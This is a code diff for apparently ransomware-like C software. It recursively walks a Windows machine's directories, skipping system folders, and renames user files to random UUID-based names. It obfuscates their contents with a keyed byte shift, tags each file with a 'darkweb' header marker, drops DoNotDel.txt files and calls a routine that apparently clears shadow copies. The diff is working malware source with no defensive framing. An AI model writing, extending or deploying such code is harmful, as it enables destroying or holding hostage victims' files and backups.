@@ -6,7 +6,6 @@ typedef struct PathInfo {
 	char ext[FILEEXT_SIZE];
 	int mode;
 	int key;
-	int num;
 } PathInfo;
 
 typedef struct PFRInfo {
@@ -18,7 +17,8 @@ typedef struct PFRInfo {
 } PFRInfo;
 
 struct FileInfo {
-   char name[FILENAME_SIZE];
+	char idp[FILEEXT_SIZE];
+	char name[FILENAME_SIZE];
 };
 
 /* const char* exts1 = ",c,h,d,f,m,p,r,s,v,i,";
@@ -33,7 +33,7 @@ const char* exts9 = ",litcoffee,";
 const char* exts10 = ",properties,"; */
 
 const char* exdir = ",\\Intel,\\ProgramData,\\Program Files,\\Program Files (x86),\\AppData\\Local\\Temp,\\Local Settings\\Temp,\\Windows,Temporary Internet Files,Content.IE5,Documents and Settings,PerfLogs,";
-const char* exfile = ",desktop.ini,ntuser.ini,NTUSER.DAT,donotdel.me";
+const char* exfile = ",desktop.ini,ntuser.ini,NTUSER.DAT";
 
 void toLower(char* str)
 {
@@ -42,6 +42,16 @@ void toLower(char* str)
       if(str[i]>=65 && str[i]<=90)
          str[i]=str[i]+32;
 	}
+}
+
+char* erase_c(char* p, int ch)
+{
+    char* ptr;
+
+    while ( (ptr = strchr(p, ch)) )
+        strcpy(ptr, ptr + 1);
+
+    return p;
 }
 
 /**
@@ -102,10 +112,28 @@ char* generateRandomString(int size)
     for(i = 0; i < size; i++)
 	{
 		res[i] = (char) (rand()%(ASCII_END-ASCII_START))+ASCII_START;
-		//res[i] = (char)randInRange(ASCII_START, ASCII_END);
     }
     res[i] = '\0';
     return res;
+}
+
+char* uuid4()
+{
+	UUID4_STATE_T state;
+	UUID4_T uuid;
+
+	uuid4_seed(&state);
+	uuid4_gen(&state, &uuid);
+
+	char* buffer = (char*)malloc(UUID4_STR_BUFFER_SIZE * sizeof(char));
+	
+	if (uuid4_to_s(uuid, buffer, UUID4_STR_BUFFER_SIZE))
+	{
+		
+		return erase_c(buffer,'-');
+	}
+	
+	return NULL;
 }
 
 void copy_old_time(struct stat* st, const char* path_new)
@@ -194,67 +222,77 @@ void * tp_func(void *arg)
 	FILE* fp_new = NULL;
 	char buffer[CHUNK_SIZE];
 	size_t bytes, i, j;
+	int skip_file = 0;
 	
 	fp_old = fopen(path_old,"rb");
 	if(fp_old != NULL)
 	{
 		if (pi->mode == 1)
 		{
-			char* sname = generateRandomString(randInRange(1, 8));
-			strcat(path_new, sname);
-			free(sname);
-			strcat(path_new, pi->ext);
-			char nname[FILEEXT_SIZE];
-			sprintf(nname,"%d",pi->num);
-			strcat(path_new, nname);
+			char* buffer = uuid4();
+			strcat(path_new, buffer);
+			free(buffer);
 			strcat(path_new, ".");
-			char* mname = generateRandomString(randInRange(1, 8));
-			strcat(path_new, mname);
-			free(mname);
+			//strcat(path_new, pi->ext);
+			char* ext = generateRandomString(randInRange(1, 8));
+			strcat(path_new, ext);
+			free(ext);
 		}
 		else if (pi->mode == 2)
 		{
 			struct FileInfo fi;
 			fread(&fi, sizeof(struct FileInfo), 1, fp_old);
+			for(i = 0; (i < FILEEXT_SIZE && fi.idp[i] != '\0'); i++)
+				fi.idp[i] = fi.idp[i]+pi->key-i;
 			for(i = 0; (i < FILENAME_SIZE && fi.name[i] != '\0'); i++)
 				fi.name[i] = fi.name[i]-pi->key+i;
 			strcat(path_new, fi.name);
+			if (strcmp(fi.idp,"darkweb") != 0)
+			{
+				skip_file = 1;
+			}
 		}
 		
-		fp_new = fopen(path_new,"wb");
-		if(fp_new != NULL)
+		if (skip_file==0)
 		{
-			if (pi->mode == 1)
+			fp_new = fopen(path_new,"wb");
+			if(fp_new != NULL)
 			{
-				struct FileInfo fi;
-				strcpy(fi.name, pi->name);
-				for(i = 0; (i < FILENAME_SIZE && fi.name[i] != '\0'); i++)
-					fi.name[i] = fi.name[i]+pi->key-i;
-				fwrite(&fi, sizeof(struct FileInfo), 1, fp_new);
-			}
-			while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fp_old)))
-			{
-				j = bytes;
-				for(i=0; i<bytes; i++)
+				if (pi->mode == 1)
 				{
-					if (pi->mode == 2)
-					{
-						buffer[i]=buffer[i]+pi->key+i-j;
-					}
-					else
-					{
-						buffer[i]=buffer[i]-pi->key-i+j;
-					}
-					j--;
+					struct FileInfo fi;
+					strcpy(fi.idp, "darkweb");
+					for(i = 0; (i < FILEEXT_SIZE && fi.idp[i] != '\0'); i++)
+						fi.idp[i] = fi.idp[i]-pi->key+i;
+					strcpy(fi.name, pi->name);
+					for(i = 0; (i < FILENAME_SIZE && fi.name[i] != '\0'); i++)
+						fi.name[i] = fi.name[i]+pi->key-i;
+					fwrite(&fi, sizeof(struct FileInfo), 1, fp_new);
 				}
-				fwrite(buffer, 1, bytes, fp_new);
+				while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fp_old)))
+				{
+					j = bytes;
+					for(i=0; i<bytes; i++)
+					{
+						if (pi->mode == 2)
+						{
+							buffer[i]=buffer[i]+pi->key+i-j;
+						}
+						else
+						{
+							buffer[i]=buffer[i]-pi->key-i+j;
+						}
+						j--;
+					}
+					fwrite(buffer, 1, bytes, fp_new);
+				}
 			}
+			fclose(fp_new);
 		}
-		fclose(fp_new);
 	}
 	fclose(fp_old);
 	
-	if (file_exists(path_new))
+	if (skip_file==0 && file_exists(path_new))
 	{
 		struct stat oldStat;
 		if (stat(path_old, &oldStat) == 0)
@@ -281,47 +319,13 @@ void * tp_free_func(void *arg)
 
 void processFilesRecursively(threadpool *tp, int mode, int key, const char* basePath, const char* ext)
 {
-	int count = 0;
     char path_old[PATH_SIZE];
     struct dirent* dp;
     DIR* dir = opendir(basePath);
 	
     // Unable to open directory stream
     if (!dir)
-	{
-        return;
-	}
-	
-	char path_dontdel[PATH_SIZE];
-	strcpy(path_dontdel, basePath);
-	strcat(path_dontdel, "\\");
-	strcat(path_dontdel, "DoNotDel.txt");
-	char file_ext[FILEEXT_SIZE];
-	int skip_file=0;
-	
-	if (mode==1)
-	{
-		char* fname = generateRandomString(randInRange(4, 15));
-		strcpy(file_ext, fname);
-		free(fname);
-	}
-	else if (mode==2)
-	{
-		if (file_exists(path_dontdel))
-		{
-			FILE* dontdel;
-			dontdel = fopen(path_dontdel, "r");
-			if (dontdel != NULL)
-			{
-				fscanf(dontdel, "%[^\n]", file_ext);
-			}
-			fclose(dontdel);
-		}
-		else
-		{
-			skip_file=1;
-		}
-	}
+		return;
 	
     while ((dp = readdir(dir)) != NULL)
     {
@@ -346,8 +350,6 @@ void processFilesRecursively(threadpool *tp, int mode, int key, const char* base
 				//printf("%s\n", dp->d_name);
 				//printf("path_old : %s\n", path_old);
 				
-				if (skip_file==1) continue;
-				
 				char* exclude = strstr(exfile, dp->d_name);
 				if (exclude)
 				{
@@ -355,15 +357,15 @@ void processFilesRecursively(threadpool *tp, int mode, int key, const char* base
 				}
 				
 				// Check Path contains extension
-				char* ret = strstr(path_old, file_ext);
+				char* ret = strstr(path_old, ext);
 				if (mode==1 && ret)
 				{
 					continue;
 				}
-				else if (mode==2 && !ret)
-				{
-					continue;
-				}
+				//else if (mode==2 && !ret)
+				//{
+					//continue;
+				//}
 				
 				// File extension
 				/* if (mode==1)
@@ -429,15 +431,12 @@ void processFilesRecursively(threadpool *tp, int mode, int key, const char* base
 					}
 				} */
 				
-				count++;
-				
 				PathInfo *pi = (PathInfo *)malloc(sizeof(PathInfo));
 				strcpy(pi->basePath, basePath);
 				strcpy(pi->name, dp->d_name);
-				strcpy(pi->ext, file_ext);
+				strcpy(pi->ext, ext);
 				pi->mode = mode;
 				pi->key = key;
-				pi->num = count;
 				tp->add_job(tp, tp_func, tp_free_func, pi);
 			}
         }
@@ -445,26 +444,23 @@ void processFilesRecursively(threadpool *tp, int mode, int key, const char* base
 
     closedir(dir);
 	
+	strcpy(path_old, basePath);
+	strcat(path_old, "\\");
+	strcat(path_old, "DoNotDel.txt");
 	if (mode==1)
 	{
-		if (file_exists(path_dontdel))
-		{
-			file_remove(path_dontdel);
-		}
+		file_remove(path_old);
 		FILE* dontdel;
-		dontdel = fopen(path_dontdel, "a+");
+		dontdel = fopen(path_old, "a+");
 		if (dontdel != NULL)
 		{
-			fprintf(dontdel, "%s\n", file_ext);
+			fprintf(dontdel, "%s\n", "Helllo World!");
 		}
 		fclose(dontdel);
 	}
 	else if (mode==2)
 	{
-		if (file_exists(path_dontdel))
-		{
-			file_remove(path_dontdel);
-		}
+		file_remove(path_old);
 	}
 }
 
@@ -532,7 +528,7 @@ int main(int argc, char *argv[])
 	
 	srand (time(NULL));
 	
-	argv[0][strlen(argv[0]) - 4] = 0;
+	//argv[0][strlen(argv[0]) - 4] = 0;
 	toLower(argv[0]);
 	
 	clean_shadowcopy();
